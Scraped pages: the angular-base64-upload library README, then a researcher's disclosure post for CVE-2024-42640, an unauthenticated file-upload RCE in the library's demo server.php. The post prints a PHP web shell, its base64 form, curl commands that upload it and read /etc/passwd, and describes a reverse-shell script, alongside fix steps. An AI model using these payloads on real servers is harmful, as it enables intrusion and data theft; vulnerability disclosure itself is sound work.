=== Content from github.com_f7672d45_20250110_212519.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadonespitogo%2Fangular-base64-upload)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadonespitogo%2Fangular-base64-upload)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=adonespitogo%2Fangular-base64-upload)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[adonespitogo](/adonespitogo)
/
**[angular-base64-upload](/adonespitogo/angular-base64-upload)**
Public

* [Notifications](/login?return_to=%2Fadonespitogo%2Fangular-base64-upload) You must be signed in to change notification settings
* [Fork
  121](/login?return_to=%2Fadonespitogo%2Fangular-base64-upload)
* [Star
   283](/login?return_to=%2Fadonespitogo%2Fangular-base64-upload)

Converts files from file input into base64 encoded models.

[283
stars](/adonespitogo/angular-base64-upload/stargazers) [121
forks](/adonespitogo/angular-base64-upload/forks) [Branches](/adonespitogo/angular-base64-upload/branches) [Tags](/adonespitogo/angular-base64-upload/tags) [Activity](/adonespitogo/angular-base64-upload/activity)
 [Star](/login?return_to=%2Fadonespitogo%2Fangular-base64-upload)

 [Notifications](/login?return_to=%2Fadonespitogo%2Fangular-base64-upload) You must be signed in to change notification settings

* [Code](/adonespitogo/angular-base64-upload)
* [Issues
  31](/adonespitogo/angular-base64-upload/issues)
* [Pull requests
  2](/adonespitogo/angular-base64-upload/pulls)
* [Actions](/adonespitogo/angular-base64-upload/actions)
* [Projects
  0](/adonespitogo/angular-base64-upload/projects)
* [Wiki](/adonespitogo/angular-base64-upload/wiki)
* [Security](/adonespitogo/angular-base64-upload/security)
* [Insights](/adonespitogo/angular-base64-upload/pulse)

Additional navigation options

* [Code](/adonespitogo/angular-base64-upload)
* [Issues](/adonespitogo/angular-base64-upload/issues)
* [Pull requests](/adonespitogo/angular-base64-upload/pulls)
* [Actions](/adonespitogo/angular-base64-upload/actions)
* [Projects](/adonespitogo/angular-base64-upload/projects)
* [Wiki](/adonespitogo/angular-base64-upload/wiki)
* [Security](/adonespitogo/angular-base64-upload/security)
* [Insights](/adonespitogo/angular-base64-upload/pulse)

# adonespitogo/angular-base64-upload

    master[Branches](/adonespitogo/angular-base64-upload/branches)[Tags](/adonespitogo/angular-base64-upload/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[342 Commits](/adonespitogo/angular-base64-upload/commits/master/) | | |
| [dist](/adonespitogo/angular-base64-upload/tree/master/dist "dist") | | [dist](/adonespitogo/angular-base64-upload/tree/master/dist "dist") |  |  |
| [src](/adonespitogo/angular-base64-upload/tree/master/src "src") | | [src](/adonespitogo/angular-base64-upload/tree/master/src "src") |  |  |
| [test](/adonespitogo/angular-base64-upload/tree/master/test "test") | | [test](/adonespitogo/angular-base64-upload/tree/master/test "test") |  |  |
| [.editorconfig](/adonespitogo/angular-base64-upload/blob/master/.editorconfig ".editorconfig") | | [.editorconfig](/adonespitogo/angular-base64-upload/blob/master/.editorconfig ".editorconfig") |  |  |
| [.gitignore](/adonespitogo/angular-base64-upload/blob/master/.gitignore ".gitignore") | | [.gitignore](/adonespitogo/angular-base64-upload/blob/master/.gitignore ".gitignore") |  |  |
| [.travis.yml](/adonespitogo/angular-base64-upload/blob/master/.travis.yml ".travis.yml") | | [.travis.yml](/adonespitogo/angular-base64-upload/blob/master/.travis.yml ".travis.yml") |  |  |
| [CHANGELOG.md](/adonespitogo/angular-base64-upload/blob/master/CHANGELOG.md "CHANGELOG.md") | | [CHANGELOG.md](/adonespitogo/angular-base64-upload/blob/master/CHANGELOG.md "CHANGELOG.md") |  |  |
| [Gulpfile.js](/adonespitogo/angular-base64-upload/blob/master/Gulpfile.js "Gulpfile.js") | | [Gulpfile.js](/adonespitogo/angular-base64-upload/blob/master/Gulpfile.js "Gulpfile.js") |  |  |
| [README.md](/adonespitogo/angular-base64-upload/blob/master/README.md "README.md") | | [README.md](/adonespitogo/angular-base64-upload/blob/master/README.md "README.md") |  |  |
| [banner.js](/adonespitogo/angular-base64-upload/blob/master/banner.js "banner.js") | | [banner.js](/adonespitogo/angular-base64-upload/blob/master/banner.js "banner.js") |  |  |
| [bower.json](/adonespitogo/angular-base64-upload/blob/master/bower.json "bower.json") | | [bower.json](/adonespitogo/angular-base64-upload/blob/master/bower.json "bower.json") |  |  |
| [index.js](/adonespitogo/angular-base64-upload/blob/master/index.js "index.js") | | [index.js](/adonespitogo/angular-base64-upload/blob/master/index.js "index.js") |  |  |
| [package.json](/adonespitogo/angular-base64-upload/blob/master/package.json "package.json") | | [package.json](/adonespitogo/angular-base64-upload/blob/master/package.json "package.json") |  |  |
| View all files | | |

## Repository files navigation

* README
# angular-base64-upload

[![Alt text](https://camo.githubusercontent.com/9792113fa9607e30694962b5f5a4b6eb8eed87bc1c99b791afee70abb00835f2/68747470733a2f2f7472617669732d63692e6f72672f61646f6e65737069746f676f2f616e67756c61722d6261736536342d75706c6f61642e7376673f6272616e63683d6d6173746572 "Travis-CI build status")](https://camo.githubusercontent.com/9792113fa9607e30694962b5f5a4b6eb8eed87bc1c99b791afee70abb00835f2/68747470733a2f2f7472617669732d63692e6f72672f61646f6e65737069746f676f2f616e67756c61722d6261736536342d75706c6f61642e7376673f6272616e63683d6d6173746572)

Converts files from file input into base64 encoded models.
This directive is based from one of the answers in this [SO question](http://stackoverflow.com/questions/20521366/rails-4-angularjs-paperclip-how-to-upload-file).

Requires angular version greater than or equal to `1.2.0`. Tested on angular versions `1.2.0` through `1.3.15`.

```
  <input type="file" ng-model="myfile" base-sixty-four-input>
```

`$scope.myfile` :

```
  {
    "filesize": 54836, /* bytes */
    "filetype": "image/jpeg",
    "filename": "profile.jpg",
    "base64":   "/9j/4AAQSkZJRgABAgAAAQABAAD//gAEKgD/4gIctcwIQA..."
  }
```

## Installation

* Bower - `bower install angular-base64-upload`
* NPM - `npm install angular-base64-upload`

## Example

See [plunker](http://embed.plnkr.co/MTzfQASN8ZVeocAq7VcM/preview).

## Usage

Include `angular.js` and `angular-base64-upload.js` in your application and add `naif.base64` as dependency to your main module.

```
angular.module('myApp', ['naif.base64']);

```

```
<form>
  <input type='file' ng-model='yourModel' base-sixty-four-input>
</form>
```

## Multiple File Selection

Just add `multiple` attribute to the input element. `yourModel` will be an array of base64 file objects.

```
  <form>
    <input  type="file" ng-model="yourModel" multiple base-sixty-four-input>
  </form>
```

## Validations

* `maxsize` = Maximum file size in kilobytes (KB) (applied to all files when multi-select is enabled)
* `minsize` = Minimum file size in kilobytes (KB) (applied to all files when multi-select is enabled)
* `maxnum` = Maximum number of items to select (applicable only for multi-select)
* `minnum` = Minimum number of items to select (applicable only for multi-select)
* `accept` = [Input file accept attribute](http://www.w3schools.com/tags/att_input_accept.asp). `file_extension|audio/*|video/*|image/*|media_type` comma separated
* `required` = Checks if the model value is `null`, empty array `[]` or empty object `{}`

```
<form name="form">
  <input type="file" ng-model="files" name="files" multiple accept="image/*, .zip" maxsize="5000" required base-sixty-four-input>
  <span ng-show="form.files.$error.maxsize">Files must not exceed 5000 KB</span>
</form>
```

## Options

* `do-not-parse-if-oversize` = Prevents the image from being converted to base64 whenever its size exceeds the maximum file size; this can be useful to prevent the browser from freezing whenever an exceedingly large file is uploaded. If this flag is set, the base64 attribute in the model will be set to null whenever an oversized image is uploaded.
* `allow-same-file` = [*boolean*](https://www.scaler.com/topics/boolean-in-javascript/) allow or disallow selecting same file

```
<form name="form">
  <input type="file" ng-model="files" name="files" base-sixty-four-input do-not-parse-if-oversize>
</form>
```

## Custom Parser

You can implement your own parsing logic before the data gets added into the model.

Use case: You want images to be auto-resized after selecting files and add custom model attributes ([Jimp](https://github.com/oliver-moran/jimp) has been used in the example below).

```
app.controller('ctrl', function ($scope, $q) {

  $scope.resizeImage = function ( file, base64_object ) {
    // file is an instance of File constructor.
    // base64_object is an object that contains compiled base64 image data from file.
    var deferred = $q.defer();
    var url = URL.createObjectURL(file);// creates url for file object.
    Jimp.read(url)
    .then(function (item) {
      item
      .resize(1280, Jimp.AUTO)// width of 1280px, auto-adjusted height
      .quality(50)//drops the image quality to 50%
      .getBase64(file.type, function (err, newBase64) {
        if (err) {throw err;}
        var bytes = Math.round((3/4)*newBase64.length);
        base64Object.filetype = file.type;
        base64Object.filesize = bytes;
        base64Object.base64 = newBase64;
        // Note that base64 in this package doesn't contain "data:image/jpeg;base64," part,
        // while base64 string from Jimp does. It should be taken care of in back-end side.
        deferred.resolve(base64Object);
      });
    })
    .catch(function (err) {
      return console.log(err);// error handling
    });
    return deferred.promise;
  };

});

<script src='/js/jimp.min.js'></script>
<input type="file" base-sixty-four-input ng-model="images" parser="resizeImage" multiple>

```

Params:

* `File` - File object
* `Object` - base64 encoded representation of file

Note: The parser handler can return a value or a promise. In case of a promise, it's resolved value will be appended to the model.

## Events

**FileReader Events** - You can listen to all [FileReader events](https://developer.mozilla.org/en-US/docs/Web/API/FileReader#Event_handlers) by adding attributes to the input element using the format `event_name="handler"`. Ex: `onerror="errorHandlerFunc"`.

* List of file reader event names:
  + `onabort`
  + `onerror`
  + `onload`
  + `onloadstart`
  + `onloadend`
  + `onprogress`
* Params
  + `EventObject` - File reader event object depending on the event type. This can be an `abort`, `error`, `load`, `loadstart`, `loadend`, or `progress` event object.
  + `FileReader` - A [File Reader](https://developer.mozilla.org/en-US/docs/Web/API/FileReader) instance used to read the file. Each file is read by respective file reader instance.
  + `File` - Current file being read by the file reader.
  + `FileList` - Array of selected files.
  + `FileObjects` - Array of base64 file objects that are done reading.
  + `Object` - Result of reading the file. In case of reading error, `object.base64` might be undefined.

**on-change** - Unfortunately, Angular's `ng-change` directive doesn't work so well with input type file. This is the alternative way of binding to input's `onchange` event.

`<input on-change="onChangeHandlerFunc">`

* Params:
  + Event - Event object.
  + FileList - Array of selected files.

**on-after-validate** - Ran after the validations are executed and after file object(s) are added to the model.

`<input on-after-validate="onAfterValidateFunc">`

* Params:
  + Event - Event object.
  + FileObjects - Array of base64-encoded files.
  + FileList - Array of selected files.

Example event handler implementation:

```
$scope.errorHandler = function (event, reader, file, fileList, fileObjs, object) {
  console.log("An error occurred while reading file: "+file.name);
  reader.abort();
};

<form>
 <input type="file" base-sixty-four-input ng-model="myfile" onerror="errorHandler">
<form>

```

## Clearing the input element

Just assign your model with `null`, `{}` or `[]` and it will automatically clear the input element

## Server-Side

You will have to decode the base64 file in your backend by yourself.

Below is a ruby code for decoding the base64-encoded file to be passed to paperclip:

```
def create
  @resource.attachment = decode_base64
  # save resource and render response ...
end

def decode_base64
  # decode base64 string
  Rails.logger.info 'decoding base64 file'
  decoded_data = Base64.decode64(params[:your_model][:base64])
  # create 'file' understandable by Paperclip
  data = StringIO.new(decoded_data)
  data.class_eval do
    attr_accessor :content_type, :original_filename
  end

  # set file properties
  data.content_type = params[:your_model][:filetype]
  data.original_filename = params[:your_model][:filename]

  # return data to be used as the attachment file (paperclip)
  data
end
```

## Contribution

* Uses [jasmine 1.3](http://jasmine.github.io/1.3/introduction.html) in writing unit test specs
* `npm install -g gulp gulp-cli bower`
* `npm install`
* `bower install`
* `gulp test` to run unit tests
* `gulp build` to build the project
* Update `README.md` and `CHANGELOG.md` to reflect the new changes
* Update the version number of `package.json` and `bower.json`

## Change Log

See [CHANGELOG.md](/adonespitogo/angular-base64-upload/blob/master/CHANGELOG.md)

## Author

[Adones Pitogo](http://adonespitogo.com)

## Contributors

See [contributors list](https://github.com/adonespitogo/angular-base64-upload/graphs/contributors)

## License

Released under the terms of MIT License.

## About

Converts files from file input into base64 encoded models.

### Resources

[Readme](#readme-ov-file)

[Activity](/adonespitogo/angular-base64-upload/activity)
### Stars

[**283**
stars](/adonespitogo/angular-base64-upload/stargazers)
### Watchers

[**16**
watching](/adonespitogo/angular-base64-upload/watchers)
### Forks

[**121**
forks](/adonespitogo/angular-base64-upload/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fadonespitogo%2Fangular-base64-upload&report=adonespitogo+%28user%29)

## [Releases](/adonespitogo/angular-base64-upload/releases)

[32
tags](/adonespitogo/angular-base64-upload/tags)

## [Packages 0](/users/adonespitogo/packages?repo_name=angular-base64-upload)

No packages published

## [Used by 498](/adonespitogo/angular-base64-upload/network/dependents)

[* ![@christophervojick119](https://avatars.githubusercontent.com/u/192081670?s=64&v=4)
* ![@christophervojick119](https://avatars.githubusercontent.com/u/192081670?s=64&v=4)
* ![@2lambda123](https://avatars.githubusercontent.com/u/54554557?s=64&v=4)
* ![@openbridge](https://avatars.githubusercontent.com/u/3628646?s=64&v=4)
* ![@vasquezsoftwaresolutions](https://avatars.githubusercontent.com/u/176618274?s=64&v=4)
* ![@offsoc](https://avatars.githubusercontent.com/u/139764790?s=64&v=4)
* ![@seclib](https://avatars.githubusercontent.com/u/38246646?s=64&v=4)
* ![@Triveni-API-Drive-CanopusGBS](https://avatars.githubusercontent.com/u/174579647?s=64&v=4)

+ 490](/adonespitogo/angular-base64-upload/network/dependents)

## [Contributors 17](/adonespitogo/angular-base64-upload/graphs/contributors)

[+ 3 contributors](/adonespitogo/angular-base64-upload/graphs/contributors)

## Languages

* [JavaScript
  100.0%](/adonespitogo/angular-base64-upload/search?l=javascript)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.zyenra.com_7b11c2cc_20250110_212520.html ===


[zyenra@web:~$\_](/ "Designed and Coded by Creative Tim")

* [*article*
  Blog](/blog)
* *email*
  Contact

![htb-image](../assets/img/ab-sm.png)

# **CVE-2024-42640 :** Unauthenticated RCE via Angular-Base64-Upload

**Title:** Unauthenticated RCE via Angular-Base64-Upload

**Severity:** Critical - 10.0 (CVSS 4.0)

**Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H

**Researcher:** Ravindu Wickramasinghe | rvz ([@rvizx9](https://x.com/RVIZX9))

**Product:** [angular-base64-upload](https://github.com/adonespitogo/angular-base64-upload)

**Vulnerable Versions:**
< v0.1.21

**Fixed Versions:** >= v0.1.21

**CVE:**  CVE-2024-42640

**PoC Exploit:** [CVE-2024-42640
Exploit](https://github.com/rvizx/CVE-2024-42640)

## 1. Introduction

The **angular-base64-upload** library, created by [Adones
Pitogo](https://github.com/adonespitogo), is a tool designed to simplify the process of uploading base64-encoded files in
Angular applications.
While it provides valuable functionality for developers, versions <= [v0.1.20](https://github.com/adonespitogo/angular-base64-upload/archive/refs/tags/v0.1.20.tar.gz), include critical security vulnerability that can lead to unauthenticated remote code
execution (RCE).
This blog article will explore the structure of the library, highlight these vulnerabilities, exploitation and provide
recommendations for mitigation.

#### Backstory and Clarifications

This security issue was identified during a penetration test. It's important to note that this is not an inherent flaw in the library itself. Instead, it arises from the installation of a vulnerable version, particularly due to the presence of the demo folder included with the library installation. Recognizing that this vulnerability could potentially affect any server application that meets the relevant criteria to run the vulnerable component without the knowledge of users utilizing this library, it was decided to report it to MITRE after conducting an analysis of the library.
Hope this address any concerns regarding this security issue.

## 2. Analysis

The file structure of the angular-base64-upload library is as follows. For this
angular-base64-upload, [v0.1.20](https://github.com/adonespitogo/angular-base64-upload/archive/refs/tags/v0.1.20.tar.gz) version was used.

 Copy
```

      .
      ├── bower.json
      ├── CHANGELOG.md
      ├── demo
      │   ├── angular-base64-upload.js
      │   ├── index.html
      │   ├── README.md
      │   ├── server.php
      │   └── uploads
      │       └── index.php
      ├── dist
      │   ├── angular-base64-upload.js
      │   ├── angular-base64-upload.min.js
      │   └── angular-base64-upload.min.js.map
      ├── Gruntfile.js
      ├── index.js
      ├── package.json
      ├── README.md
      ├── src
      │   └── angular-base64-upload.js
      └── test
          ├── base.spec.js
          ├── clear-input.spec.js
          ├── config
          │   ├── file_loader.js
          │   ├── grunt_test_runner.js
          │   └── karma.conf.js
          ├── custom-parser.spec.js
          ├── events.spec.js
          ├── helpers
          │   ├── compiler.js
          │   ├── globals.js
          │   └── mocks.js
          └── validations.spec.js

      8 directories, 26 files

```

The versions up to v0.1.20, including itself, **include a demo folder** to demonstrate and test
the functionality.
This demo folder contains a PHP file named **server.php**. This file takes two parameters,
**base64** and **filename,**
as user input to upload files to the server, and the uploaded content will be saved inside the
**demo/uploads** directory.

 Copy
```

<?php
    class Base64File
    {
      public $base64 = '';
      public $filename = '';
      private $folder = 'uploads';

      function __construct($attrs)
      {
        $this->base64 = $attrs['base64'];
        $this->filename = $this->folder.'/'.$attrs['filename'];
        $this->decodeBase64File();
        return $this;
      }

      function decodeBase64File() {
          $ifp = fopen($this->filename, 'w');
          fwrite( $ifp, base64_decode( $this->base64) );
          fclose($ifp);
          return $ifp;
      }
    }

    //parse request payload
    $postdata = file_get_contents("php://input");
    $request = json_decode($postdata, true);
    //end parse

    $file = new Base64File($request);
    echo $file->filename;
?>

```

The server.php code lacks any kind of file upload valdiations (assuming it's developed in that
way because this suppose to be only a demo).
This allows an attacker to write any file content with any filename to the server.
The server.php code  **lacks any kind of file upload
validations** (assuming it's developed in that way because this is supposed to be only a
demo). This allows an attacker to write any file content with any filename to the server.
If there's an application using this vulnerable version of the angular-base64-upload library, and
it's accessible through **node\_modules** or **bower\_compontent** directory, this allows
**attackers to write file content on the server**. This will lead to unauthenticated remote code
execution.

## 3. Expliotation

**angular-base64-upload** versions prior to v0.1.21 are vulnerable to unauthenticated remote
code execution via the
**angular-base64-upload/demo/server.php** endpoint. Exploitation of this vulnerability
involves uploading arbitrary file content to the server, which can subsequently accessed through
the **angular-base64-upload/demo/uploads** endpoint.
This leads to the execution of previously uploaded content which enables the attacker to achieve
code execution on the server.

![angular-bug](../assets/img/angular-base64-upload-rce-poc.png)

### ⚠️   Disclaimer !

The information and exploitation steps provided in this document are intended for educational
and research purposes only. The author disclaims any responsibility for the misuse of
this information or for any consequences that may arise from its application. By accessing this
content, you agree to use it responsibly and ethically. Any malicious use of the information
presented is strictly prohibited, and the author will not be held liable for any
damages or illegal activities resulting from the use of this information.

In this article two methods will be explained.

1. Automated Exploitation
2. Manual Exploitation

### 3.1 Automated Exploitation

The automated script will look for vulnerable endpoints according to the base URL provided,
(Example: node\_modules/angular-base64-upload/...)
and if the vulnerable demo folder is found it will proceed with exploitation.
By default the script will upload a php command shell (web shell) to the server. After that a terminal-like
interface will be provided to continously execute the commands on the victim server.

The script also have an option to provide a **--rev** flag when executing it. This will attempt
to upload a php reverse shell to the target server.
It will take the listener IP address and port to update the PHP-reverse-shell that will be
downloaded from [@pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
Then it will send the PHP file to the server.php After that it will send a request to the uploaded
php-reverse-shell and you'll get the reverse shell on the target. (Please note that the PoC exploit script and the security issue fix and verification scripts may be subject to updates with varying functionalities. You can refer to the README file in the GitHub repository for more information.)

**Github PoC Exploit for Automated Exploitation:**

<https://github.com/rvizx/CVE-2024-42640>

### 3.2 Manual Exploitation

1. Send a curl request to the
**{node\_modules/bower\_components}/angular-base64-upload/demo/server.php** endpoint to see whether
it's the server is not responding with a HTTP response code 404. You'll probably get a 500. This can
be used to ideitify whether the target is
vulnerable or not. You can also test this with **angular-base64-upload/demo/index.html** (just
like in the poc exploit).

2. Send another **curl** POST request with a PHP command shell (This is discussed in the next
steps)
or a  [php-reverse-shell](https://github.com/rvizx/phprev) to the server. Write or
download the payload, then encode the content of the payload to **base64**.

Example:

 Copy
```

<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>

```

3. Convert the payload in to Base64 format
 Copy
```

PD9waHAKICAgIGlmKGlzc2V0KCRfR0VUWydjbWQnXSkpCiAgICB7CiAgICAgICAgc3lzdGVtKCRfR0VUWydjbWQnXSAuICcgMj4mMScpOwogICAgfQo/Pg==

```

4. Send the following request, which has **shell.php** as the filename and it's content as the
base64 parameter values.
 Copy
```

curl -lk -X POST \
      -H "Content-Type: application/json" \
      -d '{"base64": "<base64-content>", "filename": "shell.php"}' \
      "http://$domain/{node_modules/bower_components}/angular-base64-upload/demo/server.php"

```

5. Now, access the **shell.php** uploaded to the server folder.
 Copy
```

curl -lk "http://$domain/{node_modules/bower_components}/demo/uploads/shell.php?cmd=cat+%2Fetc%2Fpasswd"

```

6. This will execute the cat /etc/passwd command on the server and its output will be shown in the
HTTP response body (the content of the /etc/passwd file of the victim).

## 4. Fixing The Security Issue

![](https://www.zyenra.com/assets/img/verify.png)

In order to fix the security issue,

1. Update angular-base64-upload library to a version v0.1.21 or newer.
2. Remove the **demo** folder from angular-base64-upload folder under the dependency installation
   directory.

In order to fix the security issue you can use the **fix.sh** provided below, this will find the
vulnerable directory structure, which is **angular-base64-upload/demo**
and it'll delete those directories. This script also identifies potential prior exploitations if there
are any remaining or unexpected file content present in the upload directory.
Please make sure to execute the script twice to verify the issue was fixed proerply.

**GitHub Repository: (Fix and Verification):**

[Fix
and Verification Section](https://github.com/rvizx/CVE-2024-42640/tree/main?tab=readme-ov-file#fixing-and-verification)

## 5. Timeline

**21/07/2024** - Requested a CVE from MITRE

**22/07/2024** - Informed the Vendor (The project was not maintained anymore, the verndor
created
an  [issue](https://github.com/adonespitogo/angular-base64-upload/issues/117) looking
for
a new maintiner in 2022")

**26/07/2024** - Tried to contact the vendor again (No response)

**01/08/2024** - Informed MITRE that the libirary doesn't seem to be maintained anymore and I
didn't get any response from vendor so far.

**22/08/2024** - MITRE Team Assigned CVE-2024-42640

**11/10/2024** - Publicly disclosed the security issue details.

## 6. Author / Researcher

**Ravindu Wickramasinghe** | rvz ([@rvizx9](https://x.com/RVIZX9)) at [zyenra](https://www.zyenra.com)

[![main_logo](../assets/img/favicon.png)](/)
###### Zyenra Security | www.zyenra.com

All rights reserved. Copyright ©
 Zyenra Security


